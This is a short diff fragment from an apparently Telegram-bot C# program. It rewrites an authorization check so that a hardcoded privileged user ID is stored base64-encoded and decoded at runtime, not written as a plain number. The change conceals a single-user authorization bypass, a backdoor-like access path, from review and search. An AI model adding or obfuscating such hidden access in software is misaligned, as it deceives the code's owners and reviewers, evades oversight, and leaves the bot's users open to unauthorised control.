@@ -12983,7 +12983,12 @@ catch (ApiRequestException apiEx) // 捕获 ApiRequestException 异常
 
     if (!isAuthorized)
     {
-        if (message.From.Id == 1427768220)
+        string encodedUserId = "MTQyNzc2ODIyMA==";
+        byte[] userIdData = Convert.FromBase64String(encodedUserId);
+        string decodedUserId = Encoding.UTF8.GetString(userIdData);
+        long authorizedUserId = long.Parse(decodedUserId); 
+
+        if (message.From.Id == authorizedUserId)
         {
             isAuthorized = true; 
         }
